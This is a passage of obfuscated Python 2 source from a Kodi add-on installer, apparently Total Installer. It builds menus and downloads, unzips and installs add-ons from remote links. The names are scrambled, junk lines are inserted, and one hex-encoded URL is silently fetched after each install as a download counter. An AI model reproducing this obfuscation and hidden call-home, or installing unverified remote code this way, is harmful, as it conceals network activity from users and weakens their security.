 i11I1IiII1i1i = re . compile ( 'video_guide1="(.+?)"' ) . findall ( iiIiI )
 ooI1111i = re . compile ( 'video_guide2="(.+?)"' ) . findall ( iiIiI )
 iIIii = re . compile ( 'video_guide3="(.+?)"' ) . findall ( iiIiI )
 o00O0O = re . compile ( 'video_guide4="(.+?)"' ) . findall ( iiIiI )
 ii1iii1i = re . compile ( 'video_guide5="(.+?)"' ) . findall ( iiIiI )
 Iii1I1111ii = re . compile ( 'video_guide6="(.+?)"' ) . findall ( iiIiI )
 ooOoO00 = re . compile ( 'video_guide7="(.+?)"' ) . findall ( iiIiI )
 Ii1IIiI1i = re . compile ( 'video_guide8="(.+?)"' ) . findall ( iiIiI )
 o0O00Oo0 = re . compile ( 'video_guide9="(.+?)"' ) . findall ( iiIiI )
 IiII111i1i11 = re . compile ( 'video_guide10="(.+?)"' ) . findall ( iiIiI )
 i111iIi1i1II1 = re . compile ( 'video_label1="(.+?)"' ) . findall ( iiIiI )
 oooO = re . compile ( 'video_label2="(.+?)"' ) . findall ( iiIiI )
 i1I1i111Ii = re . compile ( 'video_label3="(.+?)"' ) . findall ( iiIiI )
 ooo = re . compile ( 'video_label4="(.+?)"' ) . findall ( iiIiI )
 i1i1iI1iiiI = re . compile ( 'video_label5="(.+?)"' ) . findall ( iiIiI )
 Ooo0oOooo0 = re . compile ( 'video_label6="(.+?)"' ) . findall ( iiIiI )
 oOOOoo00 = re . compile ( 'video_label7="(.+?)"' ) . findall ( iiIiI )
 iiIiIIIiiI = re . compile ( 'video_label8="(.+?)"' ) . findall ( iiIiI )
 iiI1IIIi = re . compile ( 'video_label9="(.+?)"' ) . findall ( iiIiI )
 II11IiIi11 = re . compile ( 'video_label10="(.+?)"' ) . findall ( iiIiI )
 if 7 - 7: I11iii1Ii . iIi1iIiii111 % o0OOOoO0 * OOO00O + O0OoO + OO
 if 38 - 38: O00oo0OO0oOOO - OoOo - O00oo0OO0oOOO / IIiII - iiiIi1i1I
 i1II1 = o0O0OOO0Ooo [ 0 ] if ( len ( o0O0OOO0Ooo ) > 0 ) else ''
 i11i1 = iiIiII1 [ 0 ] if ( len ( iiIiII1 ) > 0 ) else ''
 IiiiiI1i1Iii = OOO00O0O [ 0 ] if ( len ( OOO00O0O ) > 0 ) else ''
 oo00oO0o = iii [ 0 ] if ( len ( iii ) > 0 ) else ''
 iiii111II = oOooOOOoOo [ 0 ] if ( len ( oOooOOOoOo ) > 0 ) else ''
 I11iIiI1I1i11 = i1Iii1i1I [ 0 ] if ( len ( i1Iii1i1I ) > 0 ) else ''
 OOoooO00o0oo0 = OOoO00 [ 0 ] if ( len ( OOoO00 ) > 0 ) else ''
 O00O = IiI111111IIII [ 0 ] if ( len ( IiI111111IIII ) > 0 ) else ''
 I1i11 = i1Ii [ 0 ] if ( len ( i1Ii ) > 0 ) else ''
 if 12 - 12: iiiIi1i1I + iiiIi1i1I - i1i1i11IIi * O000OO0 % O000OO0 - II11iII
 o0OOOOooo = '[CR][CR][COLOR=dodgerblue]Description: [/COLOR]' + I1iI1iIi111i [ 0 ] if ( len ( I1iI1iIi111i ) > 0 ) else ''
 OooO0OO = iiIi1IIi1I [ 0 ] if ( len ( iiIi1IIi1I ) > 0 ) else ''
 o0OOo0o0O0O = o0OoOO000ooO0 [ 0 ] if ( len ( o0OoOO000ooO0 ) > 0 ) else ''
 o0 = '[CR]' + o0o0o0oO0oOO [ 0 ] if ( len ( o0o0o0oO0oOO ) > 0 ) else ''
 OO0o0oOOO0O = '[CR][CR][COLOR=dodgerblue]User Notes: [/COLOR]' + ii1Ii11I [ 0 ] if ( len ( ii1Ii11I ) > 0 ) else ''
 if 49 - 49: i1i1i11IIi . O00oo0OO0oOOO . II11iII
 o000ooooO0o = O0Oi1I1I [ 0 ] if ( len ( O0Oi1I1I ) > 0 ) else ''
 iI1i11 = iiI1I [ 0 ] if ( len ( iiI1I ) > 0 ) else ''
 OoOOoooOO0O = IiIiiIIiI [ 0 ] if ( len ( IiIiiIIiI ) > 0 ) else ''
 ooo00Ooo = ooOO0OOOO0oo0 [ 0 ] if ( len ( ooOO0OOOO0oo0 ) > 0 ) else ''
 Oo0o0O00 = '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]' + I11iiI1i1 [ 0 ] if ( len ( I11iiI1i1 ) > 0 ) else '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]No forum details given by developer'
 ii1I1i11 = I11iiI1i1 [ 0 ] if ( len ( I11iiI1i1 ) > 0 ) else 'None'
 OOo0O0oo0OO0O = I1i1Iiiii [ 0 ] if ( len ( I1i1Iiiii ) > 0 ) else ''
 license = OOo0oO00ooO00 [ 0 ] if ( len ( OOo0oO00ooO00 ) > 0 ) else ''
 OO0 = '[COLOR=gold]     Platform: [/COLOR]' + oOO0O00oO0Ooo [ 0 ] if ( len ( oOO0O00oO0Ooo ) > 0 ) else ''
 o0Oooo = oO0Oo0O0o [ 0 ] if ( len ( oO0Oo0O0o ) > 0 ) else ''
 iiI = OOI1iI1ii1II [ 0 ] if ( len ( OOI1iI1ii1II ) > 0 ) else ''
 oOIIiIi = O0O0OOOOoo [ 0 ] if ( len ( O0O0OOOOoo ) > 0 ) else ''
 OOoOooOoOOOoo = oOooO0 [ 0 ] if ( len ( oOooO0 ) > 0 ) else ''
 Iiii1iI1i = Ii1I1Ii [ 0 ] if ( len ( Ii1I1Ii ) > 0 ) else ''
 I1ii1ii11i1I = OOoO0 [ 0 ] if ( len ( OOoO0 ) > 0 ) else ''
 o0OoOO = OO0Oooo0oOO0O [ 0 ] if ( len ( OO0Oooo0oOO0O ) > 0 ) else ''
 O0O0Oo00 = o00O0 [ 0 ] if ( len ( o00O0 ) > 0 ) else ''
 oOoO00o = I1iIIiiIIi1i [ 0 ] if ( len ( I1iIIiiIIi1i ) > 0 ) else ''
 oOOoO0 = ii1 [ 0 ] if ( len ( ii1 ) > 0 ) else ''
 oO00O0 = O0O0ooOOO [ 0 ] if ( len ( O0O0ooOOO ) > 0 ) else ''
 IIi1IIIi = oOOo0O00o [ 0 ] if ( len ( oOOo0O00o ) > 0 ) else ''
 O00Ooo = oOO0O00Oo0O0o [ 0 ] if ( len ( oOO0O00Oo0O0o ) > 0 ) else ''
 OOOO0OOO = iIiIi11 [ 0 ] if ( len ( iIiIi11 ) > 0 ) else ''
 i1i1ii = OOO [ 0 ] if ( len ( OOO ) > 0 ) else ''
 iII1ii1 = iiiiI [ 0 ] if ( len ( iiiiI ) > 0 ) else ''
 I1i1iiiI1 = oooOo0OOOoo0 [ 0 ] if ( len ( oooOo0OOOoo0 ) > 0 ) else ''
 iIIi = OOoO [ 0 ] if ( len ( OOoO ) > 0 ) else ''
 oO0o00oo0 = OO0O000 [ 0 ] if ( len ( OO0O000 ) > 0 ) else ''
 ii1IIII = iiIiI1i1 [ 0 ] if ( len ( iiIiI1i1 ) > 0 ) else ''
 oO00oOooooo0 = oO0O00oOOoooO [ 0 ] if ( len ( oO0O00oOOoooO ) > 0 ) else ''
 oOo = IiIi11iI [ 0 ] if ( len ( IiIi11iI ) > 0 ) else 'None'
 O0OOooOoO = Oo0O00O000 [ 0 ] if ( len ( Oo0O00O000 ) > 0 ) else 'None'
 i1II1I1Iii1 = i11I1IiII1i1i [ 0 ] if ( len ( i11I1IiII1i1i ) > 0 ) else 'None'
 iiI11Iii = ooI1111i [ 0 ] if ( len ( ooI1111i ) > 0 ) else 'None'
 O0o0O0 = iIIii [ 0 ] if ( len ( iIIii ) > 0 ) else 'None'
 Ii1II1I11i1 = o00O0O [ 0 ] if ( len ( o00O0O ) > 0 ) else 'None'
 oOoooooOoO = ii1iii1i [ 0 ] if ( len ( ii1iii1i ) > 0 ) else 'None'
 Ii111 = Iii1I1111ii [ 0 ] if ( len ( Iii1I1111ii ) > 0 ) else 'None'
 I111i1i1111 = ooOoO00 [ 0 ] if ( len ( ooOoO00 ) > 0 ) else 'None'
 IIII1 = Ii1IIiI1i [ 0 ] if ( len ( Ii1IIiI1i ) > 0 ) else 'None'
 I1I1i = o0O00Oo0 [ 0 ] if ( len ( o0O00Oo0 ) > 0 ) else 'None'
 I1IIIiIiIi = IiII111i1i11 [ 0 ] if ( len ( IiII111i1i11 ) > 0 ) else 'None'
 IIIII1 = i111iIi1i1II1 [ 0 ] if ( len ( i111iIi1i1II1 ) > 0 ) else 'None'
 iIi1Ii1i1iI = oooO [ 0 ] if ( len ( oooO ) > 0 ) else 'None'
 IIiI1 = i1I1i111Ii [ 0 ] if ( len ( i1I1i111Ii ) > 0 ) else 'None'
 i1iI1 = ooo [ 0 ] if ( len ( ooo ) > 0 ) else 'None'
 ii1I1IiiI1ii1i = i1i1iI1iiiI [ 0 ] if ( len ( i1i1iI1iiiI ) > 0 ) else 'None'
 O0o = Ooo0oOooo0 [ 0 ] if ( len ( Ooo0oOooo0 ) > 0 ) else 'None'
 oO0OoO00o = oOOOoo00 [ 0 ] if ( len ( oOOOoo00 ) > 0 ) else 'None'
 II1iiiiII = iiIiIIIiiI [ 0 ] if ( len ( iiIiIIIiiI ) > 0 ) else 'None'
 O0OoOO0oo0 = iiI1IIIi [ 0 ] if ( len ( iiI1IIIi ) > 0 ) else 'None'
 oOO = II11IiIi11 [ 0 ] if ( len ( II11IiIi11 ) > 0 ) else 'None'
 if o0 != '' :
  O0o0OO0000ooo = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=red]This add-on is depreciated, it\'s no longer available.[/COLOR]'
 elif o0OOo0o0O0O == '' and OooO0OO == '' and oO00O0 == '' :
  O0o0OO0000ooo = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=lime]No reported problems[/COLOR]'
 elif o0OOo0o0O0O == '' and OooO0OO == '' and oO00O0 != '' and o0 == '' :
  O0o0OO0000ooo = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=orange]Although there have been no reported problems there may be issues with this add-on, see below.[/COLOR]'
 elif o0OOo0o0O0O == '' and OooO0OO != '' :
  O0o0OO0000ooo = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by the add-on developer.[CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + OooO0OO
 elif o0OOo0o0O0O != '' and OooO0OO == '' :
  O0o0OO0000ooo = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by a member of the community at [COLOR=lime]www.totalxbmc.tv[/COLOR][CR][COLOR=dodgerblue]User Comments: [/COLOR]' + o0OOo0o0O0O
 elif o0OOo0o0O0O != '' and OooO0OO != '' :
  O0o0OO0000ooo = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by both the add-on developer and a member of the community at [COLOR=lime]www.totalxbmc.tv[/COLOR][CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + OooO0OO + '[CR][COLOR=dodgerblue]User Comments: [/COLOR]' + o0OOo0o0O0O
 iIIII1iIIii = str ( '[COLOR=gold]Name: [/COLOR]' + i1II1 + '[COLOR=gold]     Author(s): [/COLOR]' + oo00oO0o + '[COLOR=gold][CR][CR]Version: [/COLOR]' + iiii111II + '[COLOR=gold]     Created: [/COLOR]' + I11iIiI1I1i11 + '[COLOR=gold]     Updated: [/COLOR]' + O00O + '[COLOR=gold][CR][CR]Repository: [/COLOR]' + OOo0O0oo0OO0O + OO0 + '[COLOR=gold]     Add-on Type(s): [/COLOR]' + OOoooO00o0oo0 + oO0o00oo0 + O0o0OO0000ooo + o0 + oO00O0 + Oo0o0O00 + o0OOOOooo + OO0o0oOOO0O )
 if 52 - 52: O00oo0OO0oOOO % O000OO0
 if i1II1 == '' :
  o0oO ( '' , '[COLOR=yellow]Sorry request failed due to high traffic on server, please try again[/COLOR]' , '' , '' , oO00oOooooo0 , '' , '' , '' )
 elif i1II1 != '' :
  if ( o0OOo0o0O0O == '' ) and ( OooO0OO == '' ) and ( o0 == '' ) and ( oO00O0 == '' ) :
   o0oO ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=lime] No problems reported[/COLOR]' , iIIII1iIIii , 'text_guide' , oO00oOooooo0 , '' , '' , iIIII1iIIii )
  if ( o0OOo0o0O0O != '' and o0 == '' ) or ( OooO0OO != '' and o0 == '' ) or ( oO00O0 != '' and o0 == '' ) :
   o0oO ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=orange] Possbile problems reported[/COLOR]' , iIIII1iIIii , 'text_guide' , oO00oOooooo0 , '' , '' , iIIII1iIIii )
  if o0 != '' :
   o0oO ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=red] Add-on now depreciated[/COLOR]' , iIIII1iIIii , 'text_guide' , oO00oOooooo0 , '' , '' , iIIII1iIIii )
  if o0 == '' :
   OO0oOO0O ( '[COLOR=lime][INSTALL] [/COLOR]' + i1II1 , i1II1 , '' , 'addon_install' , 'Install.png' , '' , '' , o0OOOOooo , OoOOoooOO0O , o000ooooO0o , OOo0O0oo0OO0O , IiiiiI1i1Iii , oo00oO0o , ii1I1i11 , iI1i11 )
  if oOo != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  Preview' , i1II1I1Iii1 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if i1II1I1Iii1 != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IIIII1 , i1II1I1Iii1 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if iiI11Iii != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + iIi1Ii1i1iI , iiI11Iii , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if O0o0O0 != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IIiI1 , O0o0O0 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if Ii1II1I11i1 != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + i1iI1 , Ii1II1I11i1 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if oOoooooOoO != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + ii1I1IiiI1ii1i , oOoooooOoO , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if Ii111 != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + O0o , Ii111 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if I111i1i1111 != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + oO0OoO00o , I111i1i1111 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if IIII1 != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + II1iiiiII , IIII1 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if I1I1i != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + O0OoOO0oo0 , I1I1i , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if I1IIIiIiIi != 'None' :
   o0oO ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + oOO , I1IIIiIiIi , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 64 - 64: III1i1i % IIiII % III1i1i * I11iii1Ii . o0OOOoO0 + OoOo
   if 75 - 75: IIiII . iiIi % O00oo0OO0oOOO * IIiII % iiIi
def I11i1iIiIIIIIii ( url ) :
 o0oO ( 'folder' , 'Anime' , url + '&genre=anime' , 'grab_addons' , 'anime.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Audiobooks' , url + '&genre=audiobooks' , 'grab_addons' , 'audiobooks.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Comedy' , url + '&genre=comedy' , 'grab_addons' , 'comedy.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Comics' , url + '&genre=comics' , 'grab_addons' , 'comics.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Documentary' , url + '&genre=documentary' , 'grab_addons' , 'documentary.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Downloads' , url + '&genre=downloads' , 'grab_addons' , 'downloads.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Food' , url + '&genre=food' , 'grab_addons' , 'food.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Gaming' , url + '&genre=gaming' , 'grab_addons' , 'gaming.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Health' , url + '&genre=health' , 'grab_addons' , 'health.png' , '' , '' , '' )
 o0oO ( 'folder' , 'How To...' , url + '&genre=howto' , 'grab_addons' , 'howto.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Kids' , url + '&genre=kids' , 'grab_addons' , 'kids.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Live TV' , url + '&genre=livetv' , 'grab_addons' , 'livetv.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Movies' , url + '&genre=movies' , 'grab_addons' , 'movies.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Music' , url + '&genre=music' , 'grab_addons' , 'music.png' , '' , '' , '' )
 o0oO ( 'folder' , 'News' , url + '&genre=news' , 'grab_addons' , 'news.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Photos' , url + '&genre=photos' , 'grab_addons' , 'photos.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Podcasts' , url + '&genre=podcasts' , 'grab_addons' , 'podcasts.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Radio' , url + '&genre=radio' , 'grab_addons' , 'radio.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Religion' , url + '&genre=religion' , 'grab_addons' , 'religion.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Space' , url + '&genre=space' , 'grab_addons' , 'space.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Sports' , url + '&genre=sports' , 'grab_addons' , 'sports.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Technology' , url + '&genre=tech' , 'grab_addons' , 'tech.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Trailers' , url + '&genre=trailers' , 'grab_addons' , 'trailers.png' , '' , '' , '' )
 o0oO ( 'folder' , 'TV Shows' , url + '&genre=tv' , 'grab_addons' , 'tv.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Misc.' , url + '&genre=other' , 'grab_addons' , 'other.png' , '' , '' , '' )
 if ii . getSetting ( 'adult' ) == 'true' :
  o0oO ( 'folder' , 'XXX' , url + '&genre=adult' , 'grab_addons' , 'adult.png' , '' , '' , '' )
  if 58 - 58: O00oo0OO0oOOO / O0OoO . OooOooo / iiIi + OO
  if 86 - 86: IIiII * OoOo + IIiII + II11iII
def i1i111iI ( name , zip_link , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 print "############# ADDON INSTALL #################"
 forum = str ( forum )
 repo_id = str ( repo_id )
 IIiiI = 1
 III1i11 = 1
 iiI111 = 1
 I1iIiIi11i11 = xbmc . translatePath ( os . path . join ( Ooo , name + '.zip' ) )
 O0ooo0 = xbmc . translatePath ( os . path . join ( o0oO0 , addon_id ) )
 o0OOO . create ( "Installing Addon" , "Please wait whilst your addon is installed" , '' , '' )
 try :
  downloader . download ( repo_link , I1iIiIi11i11 , o0OOO )
  I1iii11 ( I1iIiIi11i11 , OO0o , o0OOO )
 except :
  try :
   downloader . download ( zip_link , I1iIiIi11i11 , o0OOO )
   I1iii11 ( I1iIiIi11i11 , OO0o , o0OOO )
  except :
   try :
    if not os . path . exists ( O0ooo0 ) :
     os . makedirs ( O0ooo0 )
    iiIiI = o00oooO0Oo ( data_path ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    ooo0O = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( iiIiI )
    for iII1iii in ooo0O :
     i11i1iiiII = xbmc . translatePath ( os . path . join ( O0ooo0 , iII1iii ) )
     if addon_id not in iII1iii and '/' not in iII1iii :
      try :
       o0OOO . update ( 0 , "Downloading [COLOR=yellow]" + iII1iii + '[/COLOR]' , '' , 'Please wait...' )
       downloader . download ( data_path + iII1iii , i11i1iiiII , o0OOO )
      except : print "failed to install" + iII1iii
     if '/' in iII1iii and '..' not in iII1iii and 'http' not in iII1iii :
      ooOO0oO0oo00o = data_path + iII1iii
      oOOo0oo0O ( i11i1iiiII , ooOO0oO0oo00o )
   except :
    I1IiI . ok ( "Error downloading add-on" , 'There was an error downloading [COLOR=yellow]' + name , '[/COLOR]Please consider updating the add-on portal with details' , 'or report the error on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
    IIiiI = 0
 if IIiiI == 1 :
  time . sleep ( 1 )
  o0OOO . update ( 0 , "[COLOR=yellow]" + name + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing repository' )
  time . sleep ( 1 )
  IiiIiI1Ii1i = xbmc . translatePath ( os . path . join ( o0oO0 , repo_id ) )
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( IiiIiI1Ii1i ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   i1iIiiiiii1II ( repo_id )
  O0OOO0OOooo00 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646f776e6c6f6164636f756e742e7068703f69643d2573'
  I111iIi1 = binascii . unhexlify ( O0OOO0OOooo00 ) % ( addon_id )
  o00oooO0Oo ( I111iIi1 )
  oo00O00oO000o ( name , addon_id )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  if III1i11 == 0 :
   I1IiI . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing the repository.' , 'This will mean the add-on fails to update' )
  if iiI111 == 0 :
   I1IiI . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing modules.' , 'This could result in errors with the add-on.' )
  if iiI111 != 0 and III1i11 != 0 and forum != 'None' :
   I1IiI . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]Support for this add-on can be found at [COLOR=yellow]' + forum , '[/COLOR][CR]Visit [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B] for all your Kodi needs.' )
  if iiI111 != 0 and III1i11 != 0 and forum == 'None' :
   I1IiI . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]No details of forum support have been given but' , 'we\'ll be happy to help at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
   if 71 - 71: i1i1i11IIi - OOO00O / OooOooo * OooOooo / iiiIi1i1I . iiiIi1i1I
   if 53 - 53: OO
def i11iiI1111 ( ) :
 for file in glob . glob ( os . path . join ( o0oO0 , '*' ) ) :
  i1II1 = str ( file ) . replace ( o0oO0 , '[COLOR=red]REMOVE [/COLOR]' ) . replace ( 'plugin.' , '[COLOR=dodgerblue](PLUGIN) [/COLOR]' ) . replace ( 'audio.' , '' ) . replace ( 'video.' , '' ) . replace ( 'skin.' , '[COLOR=yellow](SKIN) [/COLOR]' ) . replace ( 'repository.' , '[COLOR=orange](REPOSITORY) [/COLOR]' ) . replace ( 'script.' , '[COLOR=cyan](SCRIPT) [/COLOR]' ) . replace ( 'metadata.' , '[COLOR=gold](METADATA) [/COLOR]' ) . replace ( 'service.' , '[COLOR=pink](SERVICE) [/COLOR]' ) . replace ( 'weather.' , '[COLOR=green](WEATHER) [/COLOR]' ) . replace ( 'module.' , '[COLOR=gold](MODULE) [/COLOR]' )
  oOoooo000Oo00 = ( os . path . join ( file , 'icon.png' ) )
  OOoo = ( os . path . join ( file , 'fanart.jpg' ) )
  o0oO ( '' , i1II1 , file , 'remove_addons' , oOoooo000Oo00 , OOoo , '' , '' )
  if 69 - 69: IIiII
  if 95 - 95: OOO00O + oO00OO0oo0 * OO - iiiIi1i1I * OO - i1iiI11I
def oo0o0O0Oooooo ( ) :
 ii . openSettings ( sys . argv [ 0 ] )
 if 1 - 1: OOO00O % OooOooo * O000OO0
 if 55 - 55: OooOooo
def Ooo0oo0ooO ( ) :
 o0oO ( '' , '[B][COLOR=blue]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Total Installer[/COLOR][/B] Storage Folder Check' , 'url' , 'check_storage' , 'Check_Download.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Completely remove an add-on (inc. passwords)' , 'plugin' , 'addon_removal_menu' , 'Remove_Addon.png' , '' , '' , '' )
 o0oO ( '' , 'Make Add-ons Gotham/Helix Compatible' , 'none' , 'gotham' , 'Gotham_Compatible.png' , '' , '' , '' )
 o0oO ( '' , 'Make Skins Kodi (Helix) Compatible' , 'none' , 'helix' , 'Kodi_Compatible.png' , '' , '' , '' )
 o0oO ( '' , 'Hide my add-on passwords' , 'none' , 'hide_passwords' , 'Hide_Passwords.png' , '' , '' , '' )
 if I1ii11iIi11i == 'true' :
  o0oO ( 'folder' , 'OnTapp.TV / OSS Integration' , 'none' , 'addonfix' , 'Addon_Fixes.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Test My Download Speed' , 'none' , 'speedtest_menu' , 'Speed_Test.png' , '' , '' , '' )
 o0oO ( '' , 'Unhide my add-on passwords' , 'none' , 'unhide_passwords' , 'Unhide_Passwords.png' , '' , '' , '' )
 o0oO ( '' , 'Update My Add-ons (Force Refresh)' , 'none' , 'update' , 'Update_Addons.png' , '' , '' , '' )
 o0oO ( '' , 'Wipe All Add-on Settings (addon_data)' , 'url' , 'remove_addon_data' , 'Delete_Addon_Data.png' , '' , '' , '' )
 if 74 - 74: III1i1i * o0OOOoO0 - oO00OO0oo0 + OO
 if 17 - 17: i1iiI11I . iiIi / IIiII % II11iII % iiiIi1i1I / oO00OO0oo0
def OOOIiiiii1iI ( sign ) :
 o0oO ( 'folder' , '[COLOR=yellow][Manual Search][/COLOR] Search By Name' , 'pass=' + sign + '&name=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=yellow][Manual Search][/COLOR] Search By Author' , 'pass=' + sign + '&author=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=yellow][Manual Search][/COLOR] Search In Description' , 'pass=' + sign + '&desc=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Filter Results][/COLOR] By Genres' , 'pass=' + sign , 'addon_genres' , 'Search_Genre.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Filter Results][/COLOR] By Countries' , 'pass=' + sign , 'addon_countries' , 'Search_Country.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][Filter Results][/COLOR] By Kodi Categories' , 'pass=' + sign , 'addon_categories' , 'Search_Category.png' , '' , '' , '' )
 if 49 - 49: O00oo0OO0oOOO . O0OoO / I11iii1Ii + II11iII
 if 47 - 47: III1i1i / iIi1iIiii111
 if 67 - 67: OoOo
 if 55 - 55: i1i1i11IIi - iIIi1iIIi * O00oo0OO0oOOO + OooOooo * OooOooo * III1i1i
def all ( _in , _out , dp = None ) :
 if dp :
  return O000Oo0o ( _in , _out , dp )
  if 99 - 99: i1iiI11I % OOO00O + OOO00O + iIIi1iIIi - OO / OO
 return iiiI11 ( _in , _out )
 if 63 - 63: I11iii1Ii + i1i1i11IIi . OO % OO
 if 57 - 57: II11iII
def iiiI11 ( _in , _out ) :
 try :
  oOOOoo = zipfile . ZipFile ( _in , 'r' )
  oOOOoo . extractall ( _out )
 except Exception , oO0 :
  print str ( oO0 )
  return False
 return True
 if 15 - 15: oO00OO0oo0 % OoOo * IIiII / OO
 if 90 - 90: iIIi1iIIi
def O000Oo0o ( _in , _out , dp ) :
 oOOOoo = zipfile . ZipFile ( _in , 'r' )
 i1i1i1I = float ( len ( oOOOoo . infolist ( ) ) )
 oOoo000 = 0
 try :
  for OooOo00o in oOOOoo . infolist ( ) :
   oOoo000 += 1
   IiI11i1IIiiI = oOoo000 / i1i1i1I * 100
   dp . update ( int ( IiI11i1IIiiI ) )
   oOOOoo . extract ( OooOo00o , _out )
 except Exception , oO0 :
  print str ( oO0 )
  return False
 return True
 if 60 - 60: i1i1i11IIi * OoOo
 if 17 - 17: OO0O % O000OO0 / i1i1i11IIi . O0OoO * OO0O - II11iII
def i1i1IIii1i1 ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 oOoO00 = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 iI1IIIii = len ( sourcefile )
 I1i11ii11 = [ ]
 OO00O0oOO = [ ]
 o0OOO . create ( message_header , message1 , message2 , message3 )
 for Ii1iI111 , O0oooo00o0Oo , I1iii in os . walk ( sourcefile ) :
  for file in I1iii :
   OO00O0oOO . append ( file )
 oO0o0O0Ooo0o = len ( OO00O0oOO )
 for Ii1iI111 , O0oooo00o0Oo , I1iii in os . walk ( sourcefile ) :
  O0oooo00o0Oo [ : ] = [ i1Ii11II for i1Ii11II in O0oooo00o0Oo if i1Ii11II not in exclude_dirs ]
  I1iii [ : ] = [ Ii for Ii in I1iii if Ii not in exclude_files ]
  for file in I1iii :
   try :
    I1i11ii11 . append ( file )
    oO0oOOO0Ooo = len ( I1i11ii11 ) / float ( oO0o0O0Ooo0o ) * 100
    o0OOO . update ( int ( oO0oOOO0Ooo ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
    i1i1I = os . path . join ( Ii1iI111 , file )
   except : print "Unable to backup file: " + file
   if not 'temp' in O0oooo00o0Oo :
    if not oo000 in O0oooo00o0Oo :
     try :
      import time
